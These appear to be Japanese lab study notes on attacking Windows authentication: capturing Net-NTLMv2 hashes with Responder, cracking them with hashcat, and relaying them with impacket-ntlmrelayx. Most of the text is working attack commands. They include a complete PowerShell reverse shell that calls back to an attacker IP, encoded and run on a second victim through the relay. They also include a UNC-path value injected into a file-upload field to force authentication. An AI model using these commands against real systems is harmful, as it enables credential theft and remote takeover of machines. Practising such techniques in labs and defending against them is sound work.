```toc
```

# Net-NTLMv2ハッシュの取得
## Responder
Kali(192.168.45.167)
```bash
# ユーザの情報確認
nc 192.168.50.211 4444

whoami
net user paul

# Responder起動
sudo responder -I tap0
```

Victim
```Powershell
dir \\192.168.45.167\test
# 以下のようにファイルアップロードの箇所に挿入できる場合もある
# filename="\\\\192.168.45.167\test.txt
```
![](../../../../assets/images/Pasted%20image%2020260429101928.png)

Kali
![](../../../../assets/images/Pasted%20image%2020260429101934.png)
```bash
hashcat --help | grep -i "ntlm"

hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```
---

# Relaying Net-NTLMv2
- victim1 192.168.248.211
- victim2 192.168.248.212
権限のない（mimikatzを使えないユーザを想定）
## impacket-ntlmrelayx
kali
```bash
# powershellを起動
pwsh
```

```powershell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.167",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}' | iconv -f UTF-8 -t UTF-16LE | base64 -w 0
# エンコードされた文字列が表示される
```

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.248.212 -c "powershell -enc <ここにエンコード文字列>"
```
-  --no-http-server HTTP サーバーを無効
- -smb2support SMB2のサポートを追加
- -tを使用してターゲットを FILES02 に設定
- -c コマンドを設定
- -enc エンコードされたコマンドを復号して実行

```bash
nc -nvlp 8080
```

```bash
nc 192.168.50.211 5555

#victim1に接続後実行
whoami
dir \\192.168.119.2\test

```
---



